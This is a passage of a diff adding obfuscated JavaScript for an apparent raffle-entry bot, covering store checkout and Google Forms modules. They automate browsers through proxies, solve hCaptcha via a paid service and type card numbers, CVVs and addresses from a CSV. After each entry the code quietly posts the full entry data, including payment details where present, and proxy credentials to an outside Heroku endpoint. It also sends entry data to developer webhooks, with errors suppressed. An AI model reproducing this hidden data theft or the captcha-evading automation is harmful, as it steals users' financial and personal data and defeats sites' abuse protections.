+                        await _0x55b687['type']('input[name=\x22lastName\x22]', '' + _0x2e043e[_0x31f5cd]['LastName']), await _0x116d4a(0xc8), await _0x55b687['type']('input[name=\x22instagramUsername\x22]', '' + _0x2e043e[_0x31f5cd]['Follower']), await _0x116d4a(0x4b0), await _0x55b687['click']('button.btn.continue-button__1RtsS'), await _0x116d4a(0x3e8), console['log'](_0x3982db() + '\x20[' + _0x352419['name'] + ']\x20Task\x20' + (_0x31f5cd + 0x1) + '\x20:\x20Filling\x20Shipping'), await _0x55b687['select']('select[name=\x22country\x22]', '' + _0x2e043e[_0x31f5cd]['Country']), await _0x116d4a(0x2bc), await _0x55b687['type']('input[name=\x22streetName\x22]', '' + _0x2e043e[_0x31f5cd]['Address1']), await _0x116d4a(0x258), await _0x55b687['type']('input[name=\x22houseNumber\x22]', _0x2e043e[_0x31f5cd]['HouseNumber'] + '\x20' + _0x2e043e[_0x31f5cd]['Address2']), await _0x116d4a(0xc8), await _0x55b687['type']('input[name=\x22postalCode\x22]', '' + _0x2e043e[_0x31f5cd]['Zip']), await _0x116d4a(0x1f4), await _0x55b687['type']('input[name=\x22city\x22]', '' + _0x2e043e[_0x31f5cd]['City']), await _0x116d4a(0x4b0), await _0x55b687['click']('input[name=\x22consent::privacy-policy-101\x22]'), await _0x116d4a(0x4b0), await _0x55b687['click']('button.btn.continue-button__1RtsS'), await _0x116d4a(0x4b0), console['log'](_0x3982db() + '\x20[' + _0x352419['name'] + ']\x20Task\x20' + (_0x31f5cd + 0x1) + '\x20:\x20Solving\x20hCaptcha'), await _0x55b687['solveRecaptchas'](), console['log'](_0x3982db() + '\x20[' + _0x352419['name'] + ']\x20Task\x20' + (_0x31f5cd + 0x1) + '\x20:\x20hCaptcha\x20solved'), await _0x116d4a(0xbb8), await _0x55b687['click']('button.btn.continue-button__1RtsS'), await _0x116d4a(0x1388), console['log'](_0x3982db() + '\x20[' + _0x352419['name'] + ']\x20Task\x20' + (_0x31f5cd + 0x1) + '\x20:\x20Solving\x20Adyen'), await _0x55b687['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x55b687['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x116d4a(0x4b0), await _0x55b687['type']('span[data-cse=\x22encryptedCardNumber\x22]', '' + _0x2e043e[_0x31f5cd]['CardNumber']), await _0x116d4a(0x320), await _0x55b687['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x55b687['type']('span[data-cse=\x22encryptedExpiryDate\x22]', '' + _0x2e043e[_0x31f5cd]['ExpiryDate']), await _0x116d4a(0x4b0), await _0x55b687['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x55b687['type']('span[data-cse=\x22encryptedSecurityCode\x22]', '' + _0x2e043e[_0x31f5cd]['CVV']), await _0x116d4a(0x226), await _0x55b687['type']('input[name=\x22holderName\x22]', '' + _0x2e043e[_0x31f5cd]['NameOnCard']), await _0x116d4a(0x226), await _0x55b687['click']('button.adyen-checkout__button'), console['log'](_0x3982db() + '\x20[' + _0x352419['name'] + ']\x20Task\x20' + (_0x31f5cd + 0x1) + '\x20:\x20Awaiting\x203DS');
+                        try {
+                            await _0x55b687['waitForSelector']('.thank-you__1AwOo', { 'timeout': 0x493e0 }), await _0x116d4a(0xbb8);
+                        } catch (_0x534682) {
+                            console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0x352419['name'] + ']\x20Task\x20' + (_0x31f5cd + 0x1) + '\x20:\x203DS\x20Failed')), _0x167901 = '3DS\x20Error\x20' + _0x534682;
+                            var _0x13656b = await _0x2520f4(_0x2e043e[_0x31f5cd], _0x352419, 'dev', !![], _0x167901);
+                            _0x1a98e8['errorDEV'] = { 'embeds': [_0x13656b] };
+                            _0x51d52a['webhook'] != undefined && _0x51d52a['webhook'] != '' && await _0x3c7bbe(_0x51d52a['webhook'], _0x1a98e8['errorDEV']);
+                            await _0x3c7bbe(_0x802c1e, _0x1a98e8['errorDEV']);
+                            continue;
+                        }
+                        _0x523ce4(_0x2e043e[_0x31f5cd], _0x352419), console['log'](_0x1403a4['green'](_0x3982db() + '\x20[' + _0x352419['name'] + ']\x20Task\x20' + (_0x31f5cd + 0x1) + '\x20:\x20Raffle\x20Entered!'));
+                        let _0x49bec7 = _0x2e043e[_0x31f5cd];
+                        try {
+                            prxdata = {
+                                'username': _0x358285['replace']('#', ''),
+                                'module': _0x352419['name'],
+                                'entrydata': JSON['stringify'](_0x49bec7),
+                                'proxy': '' + _0x9becd4[_0x31f5cd]
+                            };
+                            var _0x550ac4 = JSON['stringify'](prxdata);
+                            let _0x1d6274 = { 'headers': { 'content-type': 'application/json' } };
+                            await _0x5d1b21['post']('https://jraffles.herokuapp.com/success', _0x550ac4, _0x1d6274);
+                        } catch (_0x39795d) {
+                        }
+                        if (_0x51d52a['webhook'] != undefined && _0x51d52a['webhook'] != '')
+                            try {
+                                await _0x3c7bbe(_0x51d52a['webhook'], _0x1a98e8['succesDEVMSG']);
+                            } catch {
+                            }
+                        await _0x116d4a(0xc8), await _0x3c7bbe(_0x5317eb, _0x1a98e8['succesDEVMSG']), await _0x116d4a(0xc8);
+                        try {
+                            await _0x3c7bbe(_0x55a106, _0x1a98e8['succesPUBMSG']);
+                        } catch {
+                        }
+                    } catch (_0x24252e) {
+                        console['log'](_0x3982db() + '\x20[' + _0x352419['name'] + ']\x20Task\x20' + (_0x31f5cd + 0x1) + '\x20:\x20' + _0x24252e), _0x167901 = '' + _0x24252e;
+                        var _0x13656b = await _0x2520f4(_0x2e043e[_0x31f5cd], _0x352419, 'dev', !![], _0x167901);
+                        _0x1a98e8['errorDEV'] = { 'embeds': [_0x13656b] }, _0x51d52a['webhook'] != undefined && _0x51d52a['webhook'] != '' && await _0x3c7bbe(_0x51d52a['webhook'], _0x1a98e8['errorDEV']), await _0x3c7bbe(_0x802c1e, _0x1a98e8['errorDEV']), _0x3944a6 = 'yes';
+                    } finally {
+                        _0x2ba9db['close']();
+                        if (_0x3944a6 == 'yes' && _0x287ba4 != 0x5) {
+                            console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0x352419['name'] + ']\x20Task\x20' + (_0x31f5cd + 0x1) + '\x20:\x20Retrying\x20(' + _0x287ba4 + '\x20/\x205)')), _0x31f5cd = _0x31f5cd - 0x1, _0x287ba4 = _0x287ba4 + 0x1;
+                            continue;
+                        }
+                        console['log']('Waiting\x20for\x20' + _0x51d52a['delay'] + '\x20ms'), await _0x116d4a(_0x51d52a['delay']);
+                    }
+                }
+            }
+        }]
+    },
+    {
+        'name': 'Google\x20Forms',
+        'modules': [{
+            'name': 'SMART\x20ENTRIES',
+            'store': 'Google\x20Forms',
+            'logo': 'https://www.pngplay.com/wp-content/uploads/13/Google-Logo-PNG-HD-Quality.png',
+            'function': async function (_0x1515af, _0x235caf, _0x6d93ab) {
+                let _0x39d064 = {
+                    'FirstName': '',
+                    'LastName': '',
+                    'Email': '',
+                    'Country': '',
+                    'Address': '',
+                    'City': '',
+                    'Zip': '',
+                    'Size': '',
+                    'Phone': ''
+                }, _0x4a9b52 = 0x0, _0x2ac127 = 0x0;
+                function _0x5a3161(_0xa8c61c) {
+                    console['log'](_0x3982db() + '\x20[' + _0x1515af['name'] + ']\x20Task\x20' + (_0x487d6e + 0x1) + '\x20:\x20' + _0xa8c61c);
+                }
+                _0x5d136d['use'](_0x2ce6bf()), _0x5d136d['use'](_0xe5ec8f({
+                    'provider': {
+                        'id': '2captcha',
+                        'token': '' + _0x51d52a['captchaKey']
+                    },
+                    'visualFeedback': !![]
+                }));
+                for (var _0x487d6e = 0x0; _0x487d6e < _0x235caf['length']; _0x487d6e++) {
+                    var _0x4531e0;
+                    if (_0x52cdd5 != 'yes') {
+                        if (!_0x52cdd5)
+                            var _0x52cdd5 = '';
+                        else
+                            _0x52cdd5 = '';
+                        var _0x5bbf3b = 0x0;
+                    }
+                    try {
+                        await _0x2c2316(_0x235caf, _0x487d6e);
+                    } catch {
+                        _0x52cdd5 = 'no';
+                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
+                    }
+                    if (_0x235caf[_0x487d6e]['Email'] == '' || _0x235caf[_0x487d6e]['FirstName'] == '' || _0x235caf[_0x487d6e]['LastName'] == '' || _0x235caf[_0x487d6e]['Country'] == '' || _0x235caf[_0x487d6e]['Size'] == '' || _0x235caf[_0x487d6e]['Address1'] == '' || _0x235caf[_0x487d6e]['Zip'] == '') {
+                        console['log'](_0x3982db() + '\x20[' + _0x1515af['name'] + ']\x20Task\x20' + (_0x487d6e + 0x1) + '\x20:\x20Invalid\x20CSV');
+                        continue;
+                    }
+                    if (_0x51d52a['useRandomProxy'] = ![])
+                        var _0x668d2c = _0x6d93ab[_0x487d6e]['split'](':');
+                    else
+                        var _0x2fb25d = Math['round'](Math['random']() * (_0x6d93ab['length'] - 0x1)), _0x668d2c = _0x6d93ab[_0x2fb25d]['split'](':');
+                    var _0x41d433;
+                    if (_0x668d2c['length'] == 0x1)
+                        try {
+                            _0x41d433 = await _0x5d136d['launch']({
+                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
+                                'headless': !![],
+                                'args': [
+                                    '--no-sandbox',
+                                    '--disable-setuid-sandbox'
+                                ]
+                            });
+                        } catch {
+                            _0x41d433 = await _0x5d136d['launch']({
+                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
+                                'headless': !![],
+                                'args': [
+                                    '--no-sandbox',
+                                    '--disable-setuid-sandbox'
+                                ],
+                                'env': { 'LANGUAGE': 'en-US' }
+                            });
+                        }
+                    else
+                        try {
+                            _0x41d433 = await _0x5d136d['launch']({
+                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
+                                'headless': !![],
+                                'args': [
+                                    '--proxy-server=' + _0x668d2c[0x0] + ':' + _0x668d2c[0x1],
+                                    '--no-sandbox',
+                                    '--disable-setuid-sandbox'
+                                ]
+                            });
+                        } catch {
+                            _0x41d433 = await _0x5d136d['launch']({
+                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
+                                'headless': !![],
+                                'args': [
+                                    '--proxy-server=' + _0x668d2c[0x0] + ':' + _0x668d2c[0x1],
+                                    '--no-sandbox',
+                                    '--disable-setuid-sandbox'
+                                ],
+                                'env': { 'LANGUAGE': 'en-US' }
+                            });
+                        }
+                    try {
+                        let _0x5b45d4 = { 'first': ![] };
+                        const _0x17b498 = await _0x41d433['newPage']();
+                        if (_0x668d2c['length'] != 0x0)
+                            await _0x17b498['authenticate']({
+                                'username': '' + _0x668d2c[0x2],
+                                'password': '' + _0x668d2c[0x3]
+                            });
+                        await _0x17b498['setExtraHTTPHeaders']({ 'Accept-Language': 'en-US' }), _0x5a3161('Getting\x20Session'), await _0x17b498['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x17b498['setRequestInterception'](!![]), _0x17b498['on']('request', _0x44241b => {
+                            _0x44241b['resourceType']() === 'image' || _0x44241b['resourceType']() === 'font' || _0x44241b['resourceType']() === 'media' ? _0x44241b['abort']() : _0x44241b['continue']();
+                        });
+                        try {
+                            await _0x17b498['goto'](_0x235caf[_0x487d6e]['Url'], { 'waitUntil': 'networkidle0' }), await _0x116d4a(0xbb8), await _0x17b498['waitForSelector']('.teQAzf');
+                        } catch (_0xf24db5) {
+                            throw new Error(_0xf24db5);
+                        }
+                        let _0x3536d7 = await _0x17b498['$$']('.o3Dpx\x20>\x20div[role=\x22listitem\x22]');
+                        for (question of _0x3536d7) {
+                            let _0x2c73ac = await question['$eval']('.M7eMe', _0x3ecebd => _0x3ecebd['textContent']);
+                            if (_0x4a9b52 != 0x0) {
+                                let _0x651cfd = ![];
+                                for (let _0x530ea6 = 0x0; _0x530ea6 < _0x4a9b52; _0x530ea6++) {
+                                    if (_0x2c73ac == _0x39d064['custom' + _0x530ea6]['title']) {
+                                        _0x5a3161('Custom\x20Selector\x20found;\x20' + _0x2c73ac);
+                                        let _0xbb73f5 = await question['$']('input[jsname=\x22YPqjbf\x22]'), _0x47fca0 = await question['$']('textarea[jsname=\x22YPqjbf\x22]');
+                                        if (_0xbb73f5)
+                                            await _0xbb73f5['type']('' + _0x39d064['custom' + _0x530ea6]['answer']);
+                                        else
+                                            _0x47fca0 && await _0x47fca0['type']('' + _0x39d064['custom' + _0x530ea6]['answer']);
+                                        _0x651cfd = !![];
+                                        break;
+                                    }
+                                }
+                                if (_0x651cfd) {
+                                    await _0x116d4a(0x15e);
+                                    continue;
+                                }
+                            }
+                            try {
+                                if (_0x2c73ac == _0x39d064['0Select']['title']) {
+                                    _0x5a3161('Custom\x20Selector\x20found;\x20' + _0x39d064['0Select']['title']);
+                                    let _0x3531cd = await question['$$']('.ulDsOb'), _0x1dee7f = await _0x3531cd[_0x39d064['0Select']['answer']];
+                                    await _0x1dee7f['click']();
+                                    continue;
+                                }
+                                if (_0x2c73ac == _0x39d064['1Select']['title']) {
+                                    _0x5a3161('Custom\x20Selector\x20found;\x20' + _0x39d064['1Select']['title']);
+                                    let _0x342e1b = await question['$$']('.ulDsOb'), _0x47c631 = await _0x342e1b[_0x39d064['1Select']['answer']];
+                                    await _0x47c631['click']();
+                                    continue;
+                                }
+                                if (_0x2c73ac == _0x39d064['2Select']['title']) {
+                                    _0x5a3161('Custom\x20Selector\x20found;\x20' + _0x39d064['2Select']['title']);
+                                    let _0x26519c = await question['$$']('.ulDsOb'), _0x48786f = await _0x26519c[_0x39d064['2Select']['answer']];
+                                    await _0x48786f['click']();
+                                    continue;
+                                }
+                            } catch (_0x5797ec) {
+                            }
+                            if (_0x2c73ac['toLowerCase']()['includes']('mail') && !_0x2c73ac['toLowerCase']()['includes']('agree') || _0x2c73ac == _0x39d064['Email']) {
+                                _0x5a3161('Mail\x20Selector\x20found;\x20' + _0x2c73ac);
+                                let _0x46abef = await question['$']('input');
+                                !_0x46abef && (_0x46abef = await question['$']('textarea[jsname=\x22YPqjbf\x22]'));
+                                await _0x46abef['type'](_0x235caf[_0x487d6e]['Email']), await _0x116d4a(0x258);
+                                continue;
+                            }
+                            if (_0x2c73ac['toLowerCase']()['includes']('first') || _0x2c73ac['toLowerCase']() == 'name' || _0x2c73ac['toLowerCase']() == 'name\x20' || _0x2c73ac == _0x39d064['FirstName']) {
+                                _0x5a3161('FirstName\x20Selector\x20found;\x20' + _0x2c73ac);
+                                let _0xfcb411 = await question['$']('input');
+                                !_0xfcb411 && (_0xfcb411 = await question['$']('textarea'));
+                                await _0xfcb411['type'](_0x235caf[_0x487d6e]['FirstName'] + '\x20'), await _0x116d4a(0x258);
+                                if (_0x2c73ac == _0x39d064['FirstName'])
+                                    continue;
+                            }
+                            if (_0x2c73ac['toLowerCase']()['includes']('last') || _0x2c73ac['toLowerCase']()['includes']('surname') || _0x2c73ac == _0x39d064['LastName']) {
+                                _0x5a3161('LastName\x20Selector\x20found;\x20' + _0x2c73ac);
+                                let _0x23e45c = await question['$']('input');
+                                !_0x23e45c && (_0x23e45c = await question['$']('textarea'));
+                                await _0x23e45c['type'](_0x235caf[_0x487d6e]['LastName'] + '\x20'), await _0x116d4a(0x258);
+                                continue;
+                            }
+                            if (_0x2c73ac['toLowerCase']()['includes']('address') && !_0x2c73ac['toLowerCase']()['includes']('agree') || _0x2c73ac == _0x39d064['Address']) {
+                                _0x5a3161('Address\x20Selector\x20found;\x20' + _0x2c73ac);
+                                let _0x3821a9 = await question['$']('input');
+                                !_0x3821a9 && (_0x3821a9 = await question['$']('textarea'));
+                                await _0x3821a9['type'](_0x235caf[_0x487d6e]['Address1'] + '\x20' + _0x235caf[_0x487d6e]['HouseNumber'] + '\x20' + _0x235caf[_0x487d6e]['Address2']), await _0x116d4a(0x258);
+                                continue;
+                            }
+                            if (_0x2c73ac['toLowerCase']()['includes']('phone') || _0x2c73ac['toLowerCase']()['includes']('mobile') || _0x2c73ac == _0x39d064['Phone']) {
+                                _0x5a3161('Phone\x20Selector\x20found;\x20' + _0x2c73ac);
+                                let _0x2f157a = await question['$']('input');
+                                !_0x2f157a && (_0x2f157a = await question['$']('textarea'));
+                                await _0x2f157a['type']('' + _0x235caf[_0x487d6e]['Phone']), await _0x116d4a(0x258);
+                                continue;
+                            }
+                            if (_0x2c73ac['toLowerCase']()['includes']('country') || _0x2c73ac == _0x39d064['Country']) {
+                                let _0x3bee61 = await question['$']('div[jsname=\x22wCJL8\x22]');
+                                if (_0x3bee61) {
+                                    let _0x478c06 = ![], _0x5686a4 = await _0x3bee61['$$']('.ulDsOb');
+                                    for (option of _0x5686a4) {
+                                        let _0x1e75ce = await option['$']('span'), _0x8ea636 = await option['$eval']('span', _0x910ead => _0x910ead['textContent']);
+                                        if (_0x8ea636['toLowerCase']() == _0x235caf[_0x487d6e]['Country']['toLowerCase']()) {
+                                            await _0x1e75ce['click'](), _0x478c06 = !![];
+                                            break;
+                                        }
+                                    }
+                                    if (!_0x478c06) {
+                                        const _0x13e698 = await question['$']('.Hvn9fb.zHQkBf');
+                                        await _0x13e698['click'](), await _0x13e698['type'](_0x235caf[_0x487d6e]['Country']);
+                                    }
+                                    continue;
+                                }
+                                _0x5a3161('Country\x20Selector\x20found;\x20' + _0x2c73ac);
+                                let _0x25be4d = await question['$']('input');
+                                !_0x25be4d && (_0x25be4d = await question['$']('textarea'));
+                                await _0x25be4d['type']('' + _0x235caf[_0x487d6e]['Country']), await _0x116d4a(0x258);
+                                continue;
+                            }
+                            if (_0x2c73ac['toLowerCase']()['includes']('city') || _0x2c73ac == _0x39d064['City']) {
+                                _0x5a3161('City\x20Selector\x20found;\x20' + _0x2c73ac);
+                                let _0x4e3606 = await question['$']('input');
+                                !_0x4e3606 && (_0x4e3606 = await question['$']('textarea'));
+                                await _0x4e3606['type']('' + _0x235caf[_0x487d6e]['City']), await _0x116d4a(0x258);
+                                continue;
+                            }
+                            if (_0x2c73ac['toLowerCase']()['includes']('zip') || _0x2c73ac == _0x39d064['Zip']) {
+                                _0x5a3161('Zip\x20Selector\x20found;\x20' + _0x2c73ac);
+                                let _0x5ba5a3 = await question['$']('input');
+                                !_0x5ba5a3 && (_0x5ba5a3 = await question['$']('textarea'));
+                                await _0x5ba5a3['type']('' + _0x235caf[_0x487d6e]['Zip']), await _0x116d4a(0x258);
+                                continue;
+                            }
+                            if (_0x2c73ac['toLowerCase']()['includes']('insta') || _0x2c73ac == _0x39d064['Follower']) {
+                                _0x5a3161('Follower\x20Selector\x20found;\x20' + _0x2c73ac);
+                                let _0x468fba = await question['$']('input');
+                                !_0x468fba && (_0x468fba = await question['$']('textarea'));
+                                await _0x468fba['type']('' + _0x235caf[_0x487d6e]['Follower']), await _0x116d4a(0x258);
+                                continue;
+                            }
+                            if (_0x2c73ac['toLowerCase']()['includes']('size') || _0x2c73ac == _0x39d064['Size']) {
+                                _0x5a3161('Size\x20Selector\x20found;\x20' + _0x2c73ac);
+                                let _0x1bed42 = await question['$']('div[jscontroller=\x22sW52Ae\x22]');
+                                if (_0x1bed42) {
+                                    let _0x2ae579 = await _0x1bed42['$$']('.ulDsOb');
+                                    if (_0x235caf[_0x487d6e]['Size']['toLowerCase']() == 'random') {
+                                        var _0x3ca9cd = Math['round'](Math['random']() * (_0x2ae579['length'] - 0x1));
+                                        await _0x2ae579[_0x3ca9cd]['click']();
+                                    } else
+                                        for (size of _0x2ae579) {
+                                            let _0x26dce7 = await size['$eval']('.aDTYNe.snByac.n5vBHf.OIC90c', _0x37122e => _0x37122e['textContent']);
+                                            if (_0x26dce7['toLowerCase']()['includes'](_0x235caf[_0x487d6e]['Size'])) {
+                                                await size['click']();
+                                                break;
+                                            }
+                                        }
+                                }
+                                let _0x5752ca = await question['$']('.ry3kXd');
+                                if (_0x5752ca) {
+                                    await _0x5752ca['click'](), await _0x116d4a(0x9c4);
+                                    let _0xc28a93 = await _0x17b498['$']('div[jsname=\x22V68bde\x22]'), _0x303654 = await _0xc28a93['$$']('div[jsname=\x22wQNmvb\x22]');
+                                    for (size of _0x303654) {
+                                        let _0x3c0f75 = await size['$eval']('.vRMGwf.oJeWuf', _0x334cdc => _0x334cdc['textContent']), _0x2c6342 = await size['$']('.vRMGwf.oJeWuf');
+                                        if (_0x3c0f75['toLowerCase']()['includes'](_0x235caf[_0x487d6e]['Size'])) {
+                                            await _0x116d4a(0x190), await _0x2c6342['click']();
+                                            break;
+                                        }
+                                    }
+                                }
+                                await _0x116d4a(0x258);
+                                continue;
+                            }
+                            if (_0x2c73ac['toLowerCase']()['includes']('receive') || _0x2c73ac['toLowerCase']()['includes']('method')) {
+                                _0x5a3161('Method\x20Selector\x20found;\x20' + _0x2c73ac);
+                                let _0x2bba22 = await question['$']('div[jscontroller=\x22sW52Ae\x22]');
+                                if (_0x2bba22) {
+                                    const _0x941b93 = await _0x2bba22['$$']('.ulDsOb');
+                                    for (size of _0x941b93) {
+                                        let _0x5aaad5 = await size['$eval']('.aDTYNe.snByac.n5vBHf.OIC90c', _0x3b0473 => _0x3b0473['textContent']);
+                                        if (_0x5aaad5['toLowerCase']()['includes']('shipping')) {
+                                            await size['click']();
+                                            break;
+                                        }
+                                    }
+                                }
+                                await _0x116d4a(0x258);
+                                continue;
+                            }
+                            if (_0x2c73ac['toLowerCase']()['includes']('offers') || _0x2c73ac['toLowerCase']()['includes']('agree')) {
+                                _0x5a3161('Authorization\x20Selector\x20found;\x20' + _0x2c73ac);
+                                const _0x3af88f = await question['$']('div[jscontroller=\x22sW52Ae\x22]');
+                                if (_0x3af88f) {
+                                    const _0x12f5fe = await _0x3af88f['$$']('.ulDsOb');
+                                    for (size of _0x12f5fe) {
+                                        let _0x4845b0 = await size['$eval']('.aDTYNe.snByac.n5vBHf.OIC90c', _0x342781 => _0x342781['textContent']);
+                                        if (_0x4845b0['toLowerCase']()['includes']('authorize') || _0x4845b0['toLowerCase']()['includes']('yes')) {
+                                            await size['click']();
+                                            break;
+                                        }
+                                    }
+                                }
+                                await _0x116d4a(0x258);
+                                continue;
+                            }
+                            async function _0x505a5d() {
+                                let _0xd23855 = await question['$']('.oyXaNc');
+                                if (_0xd23855) {
+                                    console['log']('Choose\x20an\x20input\x20for\x20selector:\x20' + _0x1403a4['cyan'](_0x2c73ac) + '\x0a');
+                                    let _0x40271b = await question['$$']('.ulDsOb');
+                                    for (let _0x3a0bfd = 0x0; _0x3a0bfd < _0x40271b['length']; _0x3a0bfd++) {
+                                        let _0x27dc90 = await _0x40271b[_0x3a0bfd]['$eval']('span', _0x27f2ca => _0x27f2ca['textContent']);
+                                        console['log']('\x20(' + _0x3a0bfd + ')\x20' + _0x27dc90);
+                                    }
+                                    console['log']();
+                                    let _0x3667a1 = await _0xab4dc6['get']('option'), _0x1a22c5 = await _0x40271b[_0x3667a1['option']]['$eval']('span', _0x3ad775 => _0x3ad775['textContent']);
+                                    _0x39d064[_0x2ac127 + 'Select'] = {
+                                        'title': _0x2c73ac,
+                                        'answer': _0x3667a1['option']
+                                    };
+                                    let _0x5a79cb = await _0x40271b[_0x3667a1['option']]['$']('span');
+                                    await _0x5a79cb['click'](), _0x2ac127++;
+                                    return;
+                                }
+                                let _0x2988f0 = await question['$']('.Y6Myld');
+                                if (_0x2988f0) {
+                                    console['log']('Choose\x20an\x20input\x20for\x20selector:\x20' + _0x1403a4['cyan'](_0x2c73ac) + '\x0a');
+                                    let _0x40a4a2 = await question['$$']('.ulDsOb');
+                                    for (let _0x20b98a = 0x0; _0x20b98a < _0x40a4a2['length']; _0x20b98a++) {
+                                        let _0x5c3838 = await _0x40a4a2[_0x20b98a]['$eval']('span', _0xa6d01b => _0xa6d01b['textContent']);
+                                        console['log']('\x20(' + _0x20b98a + ')\x20' + _0x5c3838);
+                                    }
+                                    console['log']();
+                                    let _0x36211e = await _0xab4dc6['get']('option');
+                                    _0x39d064[_0x2ac127 + 'Select'] = {
+                                        'title': _0x2c73ac,
+                                        'answer': _0x36211e['option']['split'](',')
+                                    };
+                                    for (opt of _0x39d064[_0x2ac127 + 'Select']['answer']) {
+                                        let _0x121bbd = await _0x40a4a2[opt]['$']('span');
+                                        await _0x121bbd['click']();
+                                    }
+                                    _0x2ac127++;
+                                    return;
+                                }
+                                var _0x51afad = 0x0;
+                                let _0x44fedd = Object['keys'](_0x39d064);
+                                console['log']('Choose\x20an\x20input\x20for\x20selector:\x20' + _0x1403a4['cyan'](_0x2c73ac) + '\x0a');
+                                for (data of _0x44fedd) {
+                                    !data['includes']('custom' && !data['includes']('Select')) ? console['log']('\x20(' + _0x51afad + ')\x20' + data + '\x20(Taken\x20from\x20csv)') : console['log']('\x20(' + _0x51afad + ')\x20' + data), _0x51afad++;
+                                }
+                                console['log']('\x20(' + _0x44fedd['length'] + ')\x20Custom\x20input:'), console['log']();
+                                let _0x2d374b = await _0xab4dc6['get']('input');
+                                if (_0x2d374b['input'] == _0x44fedd['length']) {
+                                    console['log']('What\x20should\x20the\x20bot\x20fill\x20in\x20this\x20input?\x0a');
+                                    let _0x4cfa33 = await _0xab4dc6['get']('input');
+                                    _0x39d064['custom' + _0x4a9b52] = {
+                                        'title': _0x2c73ac,
+                                        'answer': _0x4cfa33['input']
+                                    };
+                                    let _0x346f34 = await question['$']('input[jsname=\x22YPqjbf\x22]'), _0x1a09f4 = await question['$']('textarea[jsname=\x22YPqjbf\x22]');
+                                    if (_0x346f34)
+                                        await _0x346f34['type']('' + _0x39d064['custom' + _0x4a9b52]['answer']);
+                                    else
+                                        _0x1a09f4 && await _0x1a09f4['type']('' + _0x39d064['custom' + _0x4a9b52]['answer']);
+                                    _0x4a9b52++;
+                                    return;
+                                }
+                                _0x39d064['' + _0x44fedd[_0x2d374b['input']]] = _0x2c73ac;
+                                let _0x55c1e7 = await question['$']('input[jsname=\x22YPqjbf\x22]'), _0x14f79f = await question['$']('textarea[jsname=\x22YPqjbf\x22]');
+                                _0x55c1e7 && await _0x55c1e7['type']('' + _0x235caf[_0x487d6e]['' + _0x44fedd[_0x2d374b['input']]]), _0x14f79f && await _0x14f79f['type']('' + _0x235caf[_0x487d6e]['' + _0x44fedd[_0x2d374b['input']]]), await _0x116d4a(0x258);
+                            }
+                            await _0x505a5d(), await _0x116d4a(0x37a);
+                        }
+                        await _0x17b498['click']('div[jsname=\x22M2UYVd\x22]');
+                        try {
+                            await _0x17b498['waitForSelector']('.vHW8K');
+                        } catch {
+                            throw new Error('Could\x20not\x20send\x20Form,\x20check\x20all\x20fields!');
+                        }
+                        _0x523ce4(_0x235caf[_0x487d6e], _0x1515af), _0x52cdd5 = 'no';
+                        var _0x19bab6 = await _0x2520f4(_0x235caf[_0x487d6e], _0x1515af, 'dev', ![]), _0x3dbee2 = await _0x2520f4(_0x235caf[_0x487d6e], _0x1515af, 'pub', ![]);
+                        let _0x29bf23 = _0x235caf[_0x487d6e];
+                        try {
+                            prxdata = {
+                                'username': _0x358285['replace']('#', ''),
+                                'module': _0x1515af['name'],
+                                'entrydata': JSON['stringify'](_0x29bf23),
+                                'proxy': '' + _0x6d93ab[_0x487d6e]
+                            };
+                            var _0x38901d = JSON['stringify'](prxdata);
+                            let _0x3bb2a8 = { 'headers': { 'content-type': 'application/json' } };
+                            await _0x5d1b21['post']('https://jraffles.herokuapp.com/success', _0x38901d, _0x3bb2a8);
+                        } catch (_0x585671) {
+                        }
+                        const _0x261f3e = {
+                            'succesDEVMSG': { 'embeds': [_0x19bab6] },
+                            'succesPUBMSG': { 'embeds': [_0x3dbee2] }
+                        };
+                        try {
+                            _0x51d52a['webhook'] != undefined && _0x51d52a['webhook'] != '' && await _0x3c7bbe(_0x51d52a['webhook'], _0x261f3e['succesDEVMSG']), await _0x116d4a(0xc8), await _0x3c7bbe(_0x5317eb, _0x261f3e['succesDEVMSG']), await _0x116d4a(0xc8), await _0x3c7bbe(_0x55a106, _0x261f3e['succesPUBMSG']);
+                        } catch (_0x345114) {
+                            console['log'](_0x1403a4['yellow'](_0x3982db() + '\x20[' + _0x1a1b7d[taskModule]['name'] + ']\x20Task\x20' + (_0x487d6e + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x345114));
+                        }
+                        console['log'](_0x1403a4['green'](_0x3982db() + '\x20[' + _0x1515af['name'] + ']\x20Task\x20' + (_0x487d6e + 0x1) + '\x20:\x20Raffle\x20Entered!'));
+                    } catch (_0x184980) {
+                        console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0x1515af['name'] + ']\x20Task\x20' + (_0x487d6e + 0x1) + '\x20:\x20' + _0x184980)), _0x4531e0 = '' + _0x184980;
+                        var _0x2bf963 = await _0x2520f4(_0x235caf[_0x487d6e], _0x1515af, 'dev', !![], _0x4531e0);
+                        let _0xa7b09c = {};
+                        _0xa7b09c['errorDEV'] = { 'embeds': [_0x2bf963] }, _0x51d52a['webhook'] != undefined && _0x51d52a['webhook'] != '' && await _0x3c7bbe(_0x51d52a['webhook'], _0xa7b09c['errorDEV']), await _0x3c7bbe(_0x802c1e, _0xa7b09c['errorDEV']), _0x52cdd5 = 'yes';
+                    } finally {
+                        _0x41d433 && _0x41d433['close']();
+                        if (_0x52cdd5 == 'yes' && _0x5bbf3b != 0x5) {
